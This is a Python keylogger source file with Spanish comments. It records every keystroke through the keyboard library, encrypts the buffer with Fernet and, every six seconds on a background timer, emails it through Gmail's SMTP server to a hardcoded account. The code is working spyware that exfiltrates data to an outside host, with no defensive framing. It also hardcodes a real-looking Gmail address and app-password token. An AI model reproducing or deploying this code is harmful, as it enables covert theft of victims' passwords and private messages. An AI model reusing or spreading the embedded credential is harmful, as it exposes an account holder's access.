import keyboard  # Libreria para escanear el teclado
from threading import Timer
from datetime import datetime
from cryptography.fernet import Fernet
import smtplib  # Libreria para enviar correo
import ssl

ctx = ssl.create_default_context()
# cada minuto 60
# cada dia 86400
# cada semana 604800
PERIODO_ENVIO = 6
CORREO = "leomir2656@gmail.com"
TOKEN = "lqcuadiizlyygavn"


class Keylogger:
    def __init__(self, periodo_envio):
        # Guardamos el periodo de envio de los mensajes
        self.interval = periodo_envio
        # Inicializamos el mensaje
        self.log = """ """
        # Guardamos la fecha de ejecucion
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
      # Funcion se ejecuta cada vez que se teclea algo
        name = event.name
        if len(name) > 1:
            # Limpieza de caracteres
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                name = "%BORRAR%"
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Agregamos al mensaje
        self.log += name

    def enviar_correo(self, correo, token, mensaje):
        key = open('pass.key', 'rb').read()
        mensajeBytes = str.encode(mensaje)
        clave = Fernet(key)
        mensajeEncriptado = clave.encrypt(mensajeBytes)
        with smtplib.SMTP_SSL("smtp.gmail.com", port=465, context=ctx) as server:
            server.login(correo, token)
            server.sendmail(correo, correo, mensajeEncriptado)

    def reporte(self):
        #Actualiza el mensaje cara periodo de tiempo definido
        if self.log:
            # Si existe algun mensaje
            self.end_dt = datetime.now()
            self.enviar_correo(CORREO, TOKEN, self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.reporte)
        # Ejecucion en segundo plano
        timer.daemon = True
        # Reinicio del contador del periodo de tiempo
        timer.start()

    def inicio(self):
        # Obtiene la fecha de ejecucion
        self.start_dt = datetime.now()
        # Ejecuta el Keyloger en caso de usar el teclado
        keyboard.on_release(callback=self.callback)
        # Funcion para almacenar el escaneo en el mensaje
        self.reporte()
        # Mensaje de ejecucion
        print(f"{datetime.now()} - Inicio ")
        # Espera a que el proceso se termine manualmente o sino sigue en ejecucion
        keyboard.wait()


if __name__ == "__main__":
    #Creacion del Keylogger
    keylogger = Keylogger(periodo_envio=PERIODO_ENVIO)
    keylogger.inicio()